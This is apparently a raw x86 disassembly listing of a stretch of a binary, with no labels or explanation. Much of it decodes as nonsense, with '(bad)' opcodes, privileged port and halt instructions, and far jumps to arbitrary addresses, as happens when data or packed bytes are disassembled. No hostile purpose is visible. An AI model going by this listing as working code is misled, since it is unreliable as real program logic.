  414f0c:	sar    BYTE PTR [ebp+0x2af29db7],1
  414f12:	or     bl,BYTE PTR [esi+eax*8-0xa]
  414f16:	sub    dh,BYTE PTR [eax+0x13e8a7d3]
  414f1c:	stos   BYTE PTR es:[edi],al
  414f1d:	cmp    edi,DWORD PTR ds:0x2d7a58af
  414f23:	cli    
  414f24:	mov    ecx,0xfe18787f
  414f29:	leave  
  414f2a:	je     0x414ecf
  414f2c:	ins    DWORD PTR es:[edi],dx
  414f2d:	in     al,0xc5
  414f2f:	mov    WORD PTR [ecx],es
  414f31:	out    dx,al
  414f32:	pop    es
  414f33:	cmp    BYTE PTR [ecx+ebx*1+0x27],cl
  414f37:	retf   
  414f38:	cmp    edx,0x10dcaf11
  414f3e:	or     al,0x2f
  414f40:	sbb    dh,bh
  414f42:	mov    BYTE PTR [edx],cl
  414f44:	hlt    
  414f45:	aaa    
  414f46:	in     al,dx
  414f47:	call   0x5b6:0x72de3090
  414f4e:	aam    0xc6
  414f50:	push   ss
  414f51:	and    DWORD PTR [ebx+edi*4+0x798b3f10],edi
  414f58:	dec    edx
  414f59:	push   0x1a71fe46
  414f5e:	xchg   ebx,eax
  414f5f:	in     eax,dx
  414f60:	call   0xf934:0x9df49cfd
  414f67:	je     0x414eef
  414f69:	or     edi,DWORD PTR [edx+0x563e5688]
  414f6f:	sbb    ebp,ebx
  414f71:	div    BYTE PTR [edx]
  414f73:	repz jle 0x414f08
  414f76:	mov    dh,0xa5
  414f78:	push   cs
  414f79:	pushf  
  414f7a:	adc    ah,ah
  414f7c:	aad    0x1e
  414f7e:	push   ebp
  414f7f:	and    eax,0x2bc315e6
  414f84:	sub    BYTE PTR [esi+0x74],ch
  414f87:	dec    esp
  414f88:	adc    al,0x18
  414f8a:	or     BYTE PTR [eax+0x73],dl
  414f8d:	or     bh,BYTE PTR [eax]
  414f8f:	mov    edx,0x666a7488
  414f94:	pop    ss
  414f95:	or     al,dh
  414f97:	fld    QWORD PTR [ebx]
  414f99:	std    
  414f9a:	or     al,0xe8
  414f9c:	xor    eax,0x44f55d76
  414fa1:	mov    ah,0xc2
  414fa3:	sub    eax,0x5326cd02
  414fa8:	mov    al,0x33
  414faa:	(bad)  
  414fab:	jbe    0x414fb3
  414fad:	loop   0x414f53
  414faf:	or     DWORD PTR [eax+0x63],edx
  414fb2:	inc    edi
  414fb3:	les    ebx,FWORD PTR ds:[ecx+0x46bc9a82]
  414fba:	mov    al,0x22
  414fbc:	xor    edx,DWORD PTR [eax+0x7ed98056]
  414fc2:	gs call 0x3cfc3f17
  414fc8:	inc    BYTE PTR [ebx-0x20]
  414fcb:	add    eax,0x626ad6d0
  414fd0:	cdq    
  414fd1:	outs   dx,BYTE PTR ds:[esi]
  414fd2:	mov    al,0x19
  414fd4:	mov    edx,0x4d479326
  414fd9:	js     0x414f60
  414fdb:	and    BYTE PTR [eax],0xc5
  414fde:	xor    al,0x4
  414fe0:	adc    BYTE PTR [ebp+0x22],ch
  414fe3:	cdq    
  414fe4:	mov    al,ds:0xb9b65c68
  414fe9:	jo     0x415032
  414feb:	jb     0x414fb7
  414fed:	popa   
  414fee:	sahf   
  414fef:	jmp    0x8d7:0x3a1e0112
  414ff6:	(bad)  [ebx+0x74]
  414ff9:	jo     0x415001
  414ffb:	retf   
  414ffc:	and    al,0x93
  414ffe:	mov    ds:0x8635fa13,al
  415003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415004:	mov    ebx,0x41f1b5f2
  415009:	addr16 mov dl,0x9f
  41500c:	xchg   esp,eax
  41500d:	add    esp,edx
  41500f:	imul   ebx,DWORD PTR [ebx+0x2a],0x5f
  415013:	and    BYTE PTR [ebx-0x3648872f],dh
  415019:	not    dh
  41501b:	mov    ah,0x7d
  41501d:	in     eax,dx
  41501e:	adc    BYTE PTR [ecx+0x39],ah
  415021:	repnz cs mov ?,edi
  415025:	lds    edi,FWORD PTR [ecx-0x332c5e4c]
  41502b:	xchg   DWORD PTR [edx-0x3d1d45b8],esp
  415031:	sbb    BYTE PTR [edx],dl
  415033:	inc    ebp
  415034:	in     eax,dx
  415035:	gs sar dl,1
  415038:	inc    esi
  415039:	jmp    0xf262caa5
  41503e:	outs   dx,BYTE PTR ds:[esi]
  41503f:	mov    bh,0xf9
  415041:	and    esp,DWORD PTR [esi+0x46d3b385]
  415047:	mov    eax,ds:0x88bd4849
  41504c:	and    al,0xf3
  41504e:	jmp    0x4150af
  415050:	pushf  
  415051:	jae    0x415055
  415053:	ins    BYTE PTR es:[edi],dx
  415054:	leave  
  415055:	sub    al,0x7
  415057:	arpl   WORD PTR [esi],si
  415059:	xchg   edi,eax
  41505a:	out    0xcf,al
  41505c:	imul   edi,DWORD PTR [ebx],0x59e6ab57
  415062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415063:	mov    ah,0x10
  415065:	sub    dl,dh
  415067:	add    eax,0x2e1a254a
  41506c:	outs   dx,BYTE PTR ds:[esi]
  41506d:	and    al,0xf5
  41506f:	test   DWORD PTR [ebx+0x54e33088],esi
  415075:	gs mov ecx,0x552e785d
  41507b:	inc    ecx
  41507c:	and    BYTE PTR [ecx+0x79],ch
  41507f:	adc    al,0xc2
  415081:	imul   ebx,DWORD PTR [ecx+0x54],0xffffffb9
  415085:	sub    bh,BYTE PTR [esi]
  415087:	jns    0x415100
  415089:	cmp    DWORD PTR [esp+ecx*4-0x5b80feb9],ecx
  415090:	test   al,0x1d
  415092:	or     bl,dh
  415094:	adc    bl,BYTE PTR [ebx]
  415096:	test   eax,0x75beefe8
  41509b:	adc    eax,0x4ee3ae70
  4150a0:	jge    0x41505e
  4150a2:	xor    al,0x6f
  4150a4:	popf   
  4150a5:	mov    eax,ds:0xad0e4e34
  4150aa:	fs je  0x4150f9
  4150ad:	loope  0x4150c8
  4150af:	jle    0x4150aa
  4150b1:	dec    ebp
  4150b2:	nop
  4150b3:	mov    al,ds:0x7e2cce51
  4150b8:	ror    DWORD PTR [ecx],0xaf
  4150bb:	lea    ebx,[esi+0x160acc13]
  4150c1:	out    dx,al
  4150c2:	mov    ds:0xe70ab360,al
  4150c7:	mov    esi,0x46262922
  4150cc:	mov    esi,0xf92059d3
  4150d1:	cwde   
  4150d2:	fisttp DWORD PTR [edi-0x72]
  4150d5:	out    dx,al
  4150d6:	popf   
  4150d7:	xchg   edi,eax
  4150d8:	and    edi,DWORD PTR [edi]
  4150da:	pop    ebx
  4150db:	xchg   BYTE PTR [esi-0x2d2ca575],al
  4150e1:	cwde   
  4150e2:	sbb    DWORD PTR [ebp+0xe],0xfffffffe
  4150e6:	test   al,0xa2
  4150e8:	dec    edx
  4150e9:	dec    esp
  4150ea:	adc    BYTE PTR [ecx+0x65bf16c4],dh
  4150f0:	scas   eax,DWORD PTR es:[edi]
  4150f1:	fisubr DWORD PTR [ecx-0x3e]
  4150f4:	or     ch,BYTE PTR [edx-0xb]
  4150f7:	cli    
  4150f8:	mov    al,0xfa
  4150fa:	and    al,0xc3
  4150fc:	or     eax,0x79d2df41
  415101:	xlat   BYTE PTR ds:[ebx]
  415102:	enter  0x3c06,0xf3
  415106:	std    
  415107:	or     al,0x32
  415109:	(bad)  
  41510a:	adc    BYTE PTR [edi-0x3efe101b],dl
  415110:	pop    ds
  415111:	dec    edx
  415112:	xlat   BYTE PTR ds:[ebx]
  415113:	sub    BYTE PTR [edx+0x6],al
  415116:	push   esp
  415117:	xchg   edi,eax
  415118:	ficomp WORD PTR [ebx]
  41511a:	jbe    0x415171
  41511c:	in     al,0xbc
  41511e:	xchg   ecx,eax
  41511f:	cdq    
  415120:	push   edx
  415121:	add    al,0x1b
  415123:	sub    eax,0xa6fb8341
  415128:	mov    edx,0x95d0b023
  41512d:	fadd   DWORD PTR [ecx-0x60]
  415130:	jge    0x4150bf
  415132:	add    eax,DWORD PTR [edi-0x28]
  415135:	cmp    esp,DWORD PTR [ebp+0x1edd1ce7]
  41513b:	out    0xe8,eax
  41513d:	push   ebp
  41513e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41513f:	mov    bp,0x12df
  415143:	inc    eax
  415144:	lahf   
  415145:	clc    
  415146:	call   0xe340:0x3ade6bba
  41514d:	inc    esi
  41514e:	mov    ch,cl
  415150:	pop    ss
  415151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415152:	add    eax,DWORD PTR [ecx+eax*1]
  415155:	pop    ebp
  415156:	add    ch,BYTE PTR [edx-0x5a3ce2f1]
  41515c:	mov    esi,esp
  41515e:	jl     0x415102
  415160:	xchg   edi,eax
  415161:	inc    eax
  415162:	xor    esi,ecx
  415164:	push   ds
  415165:	xchg   edi,eax
  415166:	clc    
  415167:	cwde   
  415168:	add    DWORD PTR [eax-0x7f451dc8],ebp
  41516e:	push   ds
  41516f:	js     0x41515d
  415171:	add    ebp,edi
  415173:	push   ecx
  415174:	dec    esp
  415175:	out    dx,eax
  415176:	in     eax,0x51
  415178:	imul   eax,esp,0xc0e385fc
  41517e:	(bad)  
  41517f:	out    0x9a,al
  415181:	jb     0x4151b6
  415183:	fwait
  415184:	and    esp,DWORD PTR [edi+0x4cc2072a]
  41518a:	lods   eax,DWORD PTR ss:[esi]
  41518c:	inc    eax
  41518d:	mov    ebx,0x4fa48e56
  415192:	mov    bl,0x99
  415194:	push   esi
  415195:	inc    ecx
  415196:	add    DWORD PTR [edi+ebx*8],eax
  415199:	adc    DWORD PTR [edi+ebx*1+0x7ce60215],0xc5a6b069
  4151a4:	in     al,0xfe
  4151a6:	js     0x4151f7
  4151a8:	(bad)  
  4151a9:	fmul   QWORD PTR [esi]
  4151ab:	mov    edi,0xff9726f5
  4151b0:	jl     0x4151a9
  4151b2:	lods   al,BYTE PTR ds:[esi]
  4151b3:	je     0x41522c
  4151b5:	jns    0x4151b6
  4151b7:	adc    ah,BYTE PTR [ebp-0x8d90799]
  4151bd:	jle    0x415224
  4151bf:	into   
  4151c0:	pop    edi
  4151c1:	mov    bh,0x55
  4151c3:	popf   
  4151c4:	mov    edi,0xa3b83f2a
  4151c9:	cs pop esi
  4151cb:	mov    dl,0x5a
  4151cd:	(bad)  
  4151ce:	push   ebp
  4151cf:	int3   
  4151d0:	mov    edx,0x64aff937
  4151d5:	cmp    bl,dh
  4151d7:	mov    ch,0x48
  4151d9:	int3   
  4151da:	add    esp,esp
  4151dc:	shl    DWORD PTR [esi-0x4b1dcb8e],0x1b
  4151e3:	push   0xffffff92
  4151e5:	loope  0x41523f
  4151e7:	or     DWORD PTR [ecx+0xd64aef3],esp
  4151ed:	(bad)  [esi+0x3fc5bd41]
  4151f3:	pop    ebp
  4151f4:	scas   eax,DWORD PTR es:[edi]
  4151f5:	jnp    0x415270
  4151f7:	rcl    BYTE PTR [esi+eiz*1+0x75],0x33
  4151fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151fd:	mov    ah,0xa9
  4151ff:	data16 ds (bad) 
  415202:	iret   
  415203:	aam    0x4c
  415205:	mov    dl,0x77
  415207:	cwde   
  415208:	sbb    DWORD PTR [edi+ebp*2-0x1d],esi
  41520c:	inc    esi
  41520d:	data16 sbb al,0xe7
  415210:	addr16 jbe 0x41520e
  415213:	ficomp DWORD PTR [esi-0x491af1c7]
  415219:	les    esi,FWORD PTR [esi]
  41521b:	icebp  
  41521c:	push   edi
  41521d:	jae    0x415265
  41521f:	mov    ds:0x371c3780,eax
  415224:	ret    0xd9f9
  415227:	test   eax,0x2986837f
  41522c:	push   esp
  41522d:	mov    ah,0x2b
  41522f:	adc    edi,DWORD PTR [ecx-0x5028d072]
  415235:	loope  0x415203
  415237:	inc    edi
  415238:	mov    ds:0xaf815954,al
  41523d:	fs mov cl,0x65
  415240:	jle    0x415220
  415242:	popa   
  415243:	mov    edi,DWORD PTR [eax+0x5dc29521]
  415249:	ficom  DWORD PTR [eax+0x4274708d]
  41524f:	nop
  415250:	push   edx
  415251:	mov    ds:0x91eca8b5,eax
  415256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415257:	mov    ecx,0x3e7ade44
  41525c:	jg     0x415227
  41525e:	jmp    0xa29cf0f2
  415263:	sub    eax,0x51f633fe
  415268:	sbb    al,BYTE PTR [ebx+0x368608bd]
  41526e:	mov    dh,0x27
  415270:	aad    0x9b
  415272:	cmp    edx,DWORD PTR [ebp-0x690b9a02]
  415278:	mov    DWORD PTR [ebx+ebp*2],0x80f94ae9
  41527f:	lea    ebp,[edi-0x2ca46949]
  415285:	hlt    
  415286:	add    DWORD PTR [edx-0x69],esi
  415289:	xchg   ebp,eax
  41528a:	test   dl,ah
  41528c:	jne    0x415250
  41528e:	add    ebx,0x67b36dd8
  415294:	fsub   QWORD PTR [ecx-0x2a]
  415297:	repnz dec ebp
  415299:	add    BYTE PTR [ecx],dh
  41529b:	jle    0x41522f
  41529d:	mov    dh,0xb7
  41529f:	jne    0x415253
  4152a1:	jecxz  0x41529e
  4152a3:	pop    ecx
  4152a4:	dec    ebp
  4152a5:	shr    dl,cl
  4152a7:	not    BYTE PTR [esi+0x5233dedc]
  4152ad:	cmc    
  4152ae:	es rcr cl,cl
  4152b1:	repz (bad) 
  4152b3:	test   BYTE PTR [eax+0x29ceb6b9],0xd9
  4152ba:	sub    bh,BYTE PTR [edi-0x3f]
  4152bd:	add    dl,BYTE PTR [edi-0x7de0323c]
  4152c3:	pushf  
  4152c4:	fsub   DWORD PTR [ecx-0x2e1f7297]
  4152ca:	push   cs
  4152cb:	mov    bl,0x92
  4152cd:	popa   
  4152ce:	and    cl,BYTE PTR [ecx]
  4152d0:	les    ecx,FWORD PTR [esi+0x66]
  4152d3:	push   es
  4152d4:	and    ebx,DWORD PTR [ebp-0x395ff105]
  4152da:	mov    DWORD PTR [edi+0x67],ecx
  4152dd:	jno    0x41526c
  4152df:	mov    bh,bl
  4152e1:	mov    eax,ebx
  4152e3:	xor    eax,0x98983201
  4152e8:	push   esp
  4152e9:	aaa    
  4152ea:	inc    esp
  4152eb:	arpl   WORD PTR ss:[edi],bp
  4152ee:	fsub   st(3),st
  4152f0:	popa   
  4152f1:	sub    edi,ebx
  4152f3:	fwait
  4152f4:	mov    edx,0x2ca7a570
  4152f9:	jae    0x41535d
  4152fb:	icebp  
  4152fc:	ret    0x3668
  4152ff:	mov    eax,ds:0xf0d49f4d
  415304:	push   ss
  415305:	das    
  415306:	call   0x9e4c5da2
  41530b:	ins    DWORD PTR es:[edi],dx
  41530c:	dec    esi
  41530d:	pop    edi
  41530e:	int    0x2f
  415310:	fdivr  DWORD PTR [esi]
  415312:	shl    DWORD PTR [edx-0x40],0x24
  415316:	jmp    0x1bec:0xa4a204af
  41531d:	aad    0xae
  41531f:	lock and ecx,DWORD PTR [eax+0x7e]
  415323:	jmp    0x4152c7
  415325:	mov    ebp,0x9c51d1c8
  41532a:	fwait
  41532b:	bound  ecx,QWORD PTR [eax+0xb]
  41532e:	sbb    al,0x58
  415330:	nop
  415331:	mov    ah,BYTE PTR [ecx]
  415333:	test   DWORD PTR [eax],0xdffcc007
  415339:	cmp    DWORD PTR [eax+0x39],esi
  41533c:	pusha  
  41533d:	or     DWORD PTR [edx+0x1e],0x3162325b
  415344:	mov    al,ds:0xff95fa69
  415349:	xor    eax,ecx
  41534b:	mov    bh,0x11
  41534d:	xchg   edi,eax
  41534e:	dec    ebp
  41534f:	jl     0x415334
  415351:	fnsave [edx+0x3a]
  415354:	pop    es
  415355:	ja     0x4153c5
  415357:	sub    ebp,DWORD PTR [esi-0x39]
  41535a:	jmp    0x8ad20229
  41535f:	inc    esp
  415360:	or     esp,DWORD PTR [edi]
  415362:	ret    0x937e
  415365:	pop    ecx
  415366:	fistp  DWORD PTR [esi]
  415368:	ret    
  415369:	xor    eax,0xf26b3123
  41536e:	lahf   
  41536f:	lods   al,BYTE PTR ds:[esi]
  415370:	pop    ss
  415371:	jo     0x415352
  415373:	int3   
  415374:	dec    edi
  415375:	xchg   ebx,eax
  415376:	adc    edi,DWORD PTR [eax]
  415378:	fsincos 
  41537a:	rcr    BYTE PTR [edi],0x89
  41537d:	data16 cld 
  41537f:	dec    eax
  415380:	out    0xcf,eax
  415382:	add    eax,0x7b8141d
  415387:	pop    ss
  415388:	rcl    BYTE PTR [ecx-0x58dcd643],0xfe
  41538f:	xor    DWORD PTR [edx-0x64354c56],eax
  415395:	inc    eax
  415396:	pop    ecx
  415397:	lods   al,BYTE PTR ds:[esi]
  415398:	or     ebx,ebx
  41539a:	(bad)  
  41539b:	sub    al,0xa4
  41539d:	call   0xecb4:0x4bdc9cd1
  4153a4:	dec    ecx
  4153a5:	push   0xaf1a8965
  4153aa:	mov    ah,0x76
  4153ac:	inc    esi
  4153ad:	divps  xmm5,xmm1
  4153b0:	test   BYTE PTR [ebp+ecx*4-0x18],bh
  4153b4:	adc    esi,DWORD PTR [ecx]
  4153b6:	mul    BYTE PTR ds:0x394852c6
  4153bc:	das    
  4153bd:	mov    ebp,0x61f9a404
  4153c2:	out    dx,eax
  4153c3:	xchg   ecx,eax
  4153c4:	loop   0x41543d
  4153c6:	dec    ecx
  4153c7:	sti    
  4153c8:	cmp    al,0x4b
  4153ca:	pop    esp
  4153cb:	jl     0x4153f4
  4153cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153ce:	into   
  4153cf:	xor    DWORD PTR ds:0x37e0bfe1,ecx
  4153d5:	lods   al,BYTE PTR ds:[esi]
  4153d6:	mov    bl,0x21
  4153d8:	push   0xe0b39e1
  4153dd:	or     BYTE PTR [ecx],ah
  4153df:	mov    esi,0xf0679788
  4153e4:	cmc    
  4153e5:	in     eax,dx
  4153e6:	jmp    0xf22181db
  4153eb:	dec    edx
  4153ec:	imul   ecx,DWORD PTR [edi],0xcf91eb2b
  4153f2:	loopne 0x41537e
  4153f4:	daa    
  4153f5:	mov    ebx,0xfd8fc592
  4153fa:	inc    ebx
  4153fb:	cmp    ah,ch
  4153fd:	jge    0x4153b9
  4153ff:	or     esi,eax
  415401:	test   eax,0x5c07fd5a
  415406:	sti    
  415407:	bound  eax,QWORD PTR [ecx+0x3d]
  41540a:	ds xchg ebx,eax
  41540c:	jbe    0x41548d
  41540e:	sub    al,0xa5
  415410:	(bad)  
  415411:	int    0x4f
  415413:	clc    
  415414:	test   eax,0xd8393d21
  415419:	inc    eax
  41541a:	(bad)  
  41541b:	xlat   BYTE PTR ds:[ebx]
  41541c:	dec    edx
  41541d:	push   0xffffffb1
  41541f:	out    dx,al
  415420:	jbe    0x41542c
  415422:	mov    bl,0x9c
  415424:	mov    esi,0xe2116a7e
  415429:	add    esi,ebp
  41542b:	repz pop ebp
  41542d:	mov    al,0x1e
  41542f:	xchg   ebp,eax
  415430:	mov    WORD PTR [ebx-0x3a61712],?
  415436:	add    BYTE PTR [eax+0x7d],ch
  415439:	mov    al,ds:0xaba1a72f
  41543e:	call   0x164b888d
  415443:	out    0x73,al
  415445:	sbb    DWORD PTR [eax+0x70a39c69],0x38
  41544c:	or     al,0x95
  41544e:	push   ecx
  41544f:	push   ecx
  415450:	out    0x82,eax
  415452:	in     al,dx
  415453:	push   edi
  415454:	mov    esi,0x636b4c46
  415459:	dec    edi
  41545a:	fist   WORD PTR [eax+ecx*8+0x47674e4e]
  415461:	add    ch,ch
  415463:	aas    
  415464:	or     BYTE PTR [edi-0x4989dd55],al
  41546a:	xchg   esi,eax
  41546b:	fsub   st,st(4)
  41546d:	aas    
  41546e:	test   al,0x20
  415470:	cmp    eax,DWORD PTR [esi-0x7ab2a2a5]
  415476:	cs into 
  415478:	and    ebp,DWORD PTR [edi+0x68]
  41547b:	sbb    eax,0xf9e9f38d
  415480:	sbb    esi,esi
  415482:	lds    esi,FWORD PTR gs:[esi]
  415485:	popa   
  415486:	mov    ecx,0xc384fc0d
  41548b:	test   al,0x3f
  41548d:	push   cs
  41548e:	(bad)  
  41548f:	cmc    
  415490:	sbb    eax,0x7d17c574
  415495:	push   edx
  415496:	idiv   DWORD PTR [ebp-0x38fad8b5]
  41549c:	or     BYTE PTR [esi-0x673761a8],ch
  4154a2:	dec    eax
  4154a3:	ja     0x415458
  4154a5:	adc    al,0x30
  4154a7:	cmp    ah,BYTE PTR [edx-0x12]
  4154aa:	shl    bh,1
  4154ac:	xor    cl,BYTE PTR [ecx-0x5]
  4154af:	clc    
  4154b0:	xlat   BYTE PTR ds:[ebx]
  4154b1:	clc    
  4154b2:	clc    
  4154b3:	fs inc ebx
  4154b5:	lods   eax,DWORD PTR ds:[esi]
  4154b6:	pop    edx
  4154b7:	sub    edx,DWORD PTR [edi-0x22]
  4154ba:	or     eax,0x5bdb138a
  4154bf:	outs   dx,BYTE PTR ds:[esi]
  4154c0:	popa   
  4154c1:	push   0x1dfb0018
  4154c6:	inc    esi
  4154c7:	mov    esp,DWORD PTR [ebx]
  4154c9:	pop    esp
  4154ca:	loop   0x41549f
  4154cc:	adc    BYTE PTR fs:[eax+0x79322355],dh
  4154d3:	mov    BYTE PTR [edx-0x68],bh
  4154d6:	xlat   BYTE PTR ds:[ebx]
  4154d7:	push   esi
  4154d8:	retf   
  4154d9:	mov    dl,0x3c
  4154db:	div    DWORD PTR [edx]
  4154dd:	nop
  4154de:	pop    es
  4154df:	cmp    al,BYTE PTR [ecx+0x33]
  4154e2:	loopne 0x41547e
  4154e4:	jmp    esp
  4154e6:	mov    ds:0xc48f0137,al
  4154eb:	inc    ebx
  4154ec:	fwait
  4154ed:	pusha  
  4154ee:	cdq    
  4154ef:	jbe    0x415472
  4154f1:	xchg   esi,eax
  4154f2:	sub    BYTE PTR [edi-0x70],ah
  4154f5:	inc    DWORD PTR [esi]
  4154f7:	imul   esi,DWORD PTR [edx+edx*8+0x3f],0xffffffb1
  4154fc:	push   0xffffffc9
  4154fe:	rcl    DWORD PTR [ebp-0x47ea85c3],cl
  415504:	xchg   ecx,eax
  415505:	iret   
  415506:	test   esp,ecx
  415508:	in     eax,0xf6
  41550a:	xor    edi,DWORD PTR [edx+0x2e]
  41550d:	mov    ecx,DWORD PTR [eax-0x52]
  415510:	std    
  415511:	or     BYTE PTR [ecx+0x6a],dh
  415514:	adc    DWORD PTR [edx],0x1b58b5aa
  41551a:	sub    bh,BYTE PTR [ebp-0x78]
  41551d:	or     eax,0xafb62b55
  415522:	cs inc ecx
  415524:	pop    ds
  415525:	or     dh,BYTE PTR [eax]
  415527:	inc    eax
  415528:	sub    DWORD PTR [esi],0x8d7298c0
  41552e:	mov    ebp,0x132ceac5
  415533:	mov    dh,0x1f
  415535:	pop    esi
  415536:	pop    edx
  415537:	cwde   
  415538:	jbe    0x415507
  41553a:	xchg   esp,eax
  41553b:	lods   al,BYTE PTR ds:[esi]
  41553c:	jne    0x415581
  41553e:	lods   eax,DWORD PTR ds:[esi]
  41553f:	dec    edi
  415540:	or     eax,0x9cc81f72
  415545:	cmp    DWORD PTR [eax+edx*2+0x152f8b56],ebx
  41554c:	push   es
  41554d:	clc    
  41554e:	fwait
  41554f:	mov    ?,WORD PTR [edx-0x695328f2]
  415555:	into   
  415556:	aaa    
  415557:	dec    ebx
  415558:	jmp    0xdf5f:0x1af5258e
  41555f:	or     DWORD PTR [edx+edi*1-0x80],esi
  415563:	jmp    0x4155ab
  415565:	dec    ebx
  415566:	ins    DWORD PTR es:[edi],dx
  415567:	ret    
  415568:	daa    
  415569:	push   esi
  41556a:	sub    dl,al
  41556c:	(bad)  
  41556d:	jmp    0x78c6dc9a
  415572:	pusha  
  415573:	lea    ecx,ds:0xcd2358c7
  415579:	xchg   esp,eax
  41557a:	das    
  41557b:	adc    DWORD PTR cs:[ecx-0x5a89f37],ebp
  415582:	daa    
  415583:	ins    DWORD PTR es:[edi],dx
  415584:	mov    dl,BYTE PTR [edx+0x24]
  415587:	mov    dl,0x3
  415589:	into   
  41558a:	cdq    
  41558b:	dec    edx
  41558c:	sub    BYTE PTR ds:0xc3f22e5b,bl
  415592:	xchg   ebx,eax
  415593:	lock aad 0x65
  415596:	sti    
  415597:	mov    al,ds:0x333e3e1b
  41559c:	mov    dh,0x37
  41559e:	das    
  41559f:	test   ecx,ebx
  4155a1:	in     eax,dx
  4155a2:	push   ebx
  4155a3:	mov    bh,0xf
  4155a5:	inc    esp
  4155a6:	in     eax,dx
  4155a7:	push   0xde97c8f4
  4155ac:	and    DWORD PTR [edi],edx
  4155ae:	sbb    eax,0x3726f31a
  4155b3:	out    dx,eax
  4155b4:	(bad)  
  4155b6:	sub    eax,0xcb877a00
  4155bb:	push   ds
  4155bc:	or     DWORD PTR [edx-0x18],0xddf793ee
  4155c3:	push   esp
  4155c4:	push   edx
  4155c5:	push   ebp
  4155c6:	in     eax,0xdb
  4155c8:	rcl    BYTE PTR [esi-0x75e6a4a8],cl
  4155ce:	and    ah,BYTE PTR [ecx]
  4155d0:	stc    
  4155d1:	call   0x5bb4ef1
  4155d6:	rcl    ah,0xd9
  4155d9:	pop    edi
  4155db:	xchg   esi,eax
  4155dc:	rcl    edi,0x14
  4155df:	sub    al,ah
  4155e1:	jl     0x415593
  4155e3:	int3   
  4155e4:	xchg   esp,esi
  4155e6:	mov    ah,0x1
  4155e8:	je     0x415633
  4155ea:	enter  0xcd9a,0xfa
  4155ee:	aam    0x5a
  4155f0:	mov    ebx,0xff3098d
  4155f5:	mov    ecx,0x4ede9de9
  4155fa:	shr    DWORD PTR [esi+0x61],0x3d
  4155fe:	inc    eax
  4155ff:	xor    eax,0x74274324
  415604:	int3   
  415605:	xchg   edi,eax
  415606:	add    eax,0xebad2014
  41560b:	aam    0x8b
  41560d:	das    
  41560e:	push   ebx
  41560f:	hlt    
  415610:	jae    0x4155b3
  415612:	xchg   esi,eax
  415613:	dec    edx
  415614:	mov    ds:0x6448bcec,eax
  415619:	mov    dl,0xaa
  41561b:	sub    al,BYTE PTR [esi-0x1a7340d4]
  415621:	test   eax,0xe6864e49
  415626:	mov    ch,0x3d
  415628:	or     ebx,esp
  41562a:	xlat   BYTE PTR ds:[ebx]
  41562b:	lods   al,BYTE PTR ds:[esi]
  41562c:	and    bl,0x96
  41562f:	std    
  415630:	lds    esp,FWORD PTR [edi+edi*1]
  415633:	std    
  415634:	in     eax,0x5d
  415636:	and    BYTE PTR [ecx+0x6d78016f],al
  41563c:	push   ss
  41563d:	rol    BYTE PTR [edx],0xad
  415640:	xchg   eax,esp
  415642:	xchg   ecx,eax
  415643:	aam    0x30
  415645:	clc    
  415646:	jne    0x4156a3
  415648:	mov    ebp,0x509fc6ad
  41564d:	cmc    
  41564e:	xchg   esp,eax
  41564f:	fcomp  st(7)
  415651:	jbe    0x41566f
  415653:	sub    al,0x41
  415655:	stc    
  415656:	mov    bh,0x33
  415658:	inc    ecx
  415659:	pop    ecx
  41565a:	lahf   
  41565b:	adc    al,0x4f
  41565d:	dec    esp
  41565e:	outs   dx,DWORD PTR ds:[esi]
  41565f:	enter  0x8d3f,0x4e
  415663:	xchg   ecx,eax
  415664:	fs hlt 
  415666:	cmovs  ecx,DWORD PTR [eax]
  415669:	js     0x4156ea
  41566b:	mov    dh,0xf1
  41566d:	mov    esi,0x6d90a6b2
  415672:	icebp  
  415673:	xchg   edi,eax
  415674:	xchg   ebx,eax
  415675:	or     dl,dl
  415677:	mov    dh,0xea
  415679:	call   0x618a:0x2418933a
  415680:	or     BYTE PTR [edx],ah
  415682:	pop    ebx
  415683:	les    eax,FWORD PTR [ecx-0x40]
  415686:	jmp    0x26a6:0x707b184b
  41568d:	xchg   DWORD PTR [ecx],eax
  41568f:	mov    ds,WORD PTR [edi]
  415691:	xlat   BYTE PTR ds:[ebx]
  415692:	jbe    0x415689
  415694:	test   al,al
  415696:	push   es
  415697:	xor    eax,0x55bf033d
  41569c:	mov    dh,0xc1
  41569e:	or     bh,dl
  4156a0:	test   ebx,0xd3c64f14
  4156a6:	xlat   BYTE PTR ds:[ebx]
  4156a7:	add    BYTE PTR [ebp+0xc],dl
  4156aa:	sub    eax,0x65049614
  4156af:	sub    BYTE PTR [eax],ah
  4156b1:	or     BYTE PTR [edi-0x2b],dh
  4156b4:	or     DWORD PTR [eax],0x44731206
  4156ba:	lea    ecx,ds:[eax-0x1bf05ff1]
  4156c1:	cs push ds
  4156c3:	pop    edx
  4156c4:	mov    ch,0x94
  4156c6:	arpl   WORD PTR [edx],di
  4156c8:	adc    esi,eax
  4156ca:	xchg   BYTE PTR [edi+0x69],bl
  4156cd:	add    ebx,DWORD PTR [ebx+0x1d]
  4156d0:	sbb    al,0x69
  4156d2:	sub    edi,DWORD PTR [ecx-0x26]
  4156d5:	or     al,0x48
  4156d7:	jb     0x41574a
  4156d9:	sub    eax,0x77c1a89d
  4156de:	xor    bh,BYTE PTR [ebp+0x3c]
  4156e1:	mov    dl,0x16
  4156e3:	push   ecx
  4156e4:	jecxz  0x41573f
  4156e6:	cmc    
  4156e7:	fcomip st,st(2)
  4156e9:	jae    0x4156ca
  4156eb:	cmp    edx,ebx
  4156ed:	inc    esi
  4156ee:	xchg   esp,eax
  4156ef:	fwait
  4156f0:	xchg   ebp,eax
  4156f1:	add    al,0xaa
  4156f3:	jecxz  0x4156bd
  4156f5:	mov    eax,ds:0xab14877e
  4156fa:	mov    ds:0x79ce3e7d,al
  4156ff:	push   0x5d
  415701:	dec    edx
  415702:	inc    ebp
  415703:	mov    al,ds:0xf7c12a59
  415708:	lock mov ebp,0x14bb82d0
  41570e:	stc    
  41570f:	mov    dl,0x9d
  415711:	xchg   BYTE PTR [ecx+0x23c3ca46],al
  415717:	ret    0x71b6
  41571a:	sbb    eax,0xd867a31a
  41571f:	jbe    0x4156d9
  415721:	hlt    
  415722:	loope  0x4156fc
  415724:	(bad)  
  415725:	pop    eax
  415726:	and    bl,BYTE PTR [edi+0x5047bdd3]
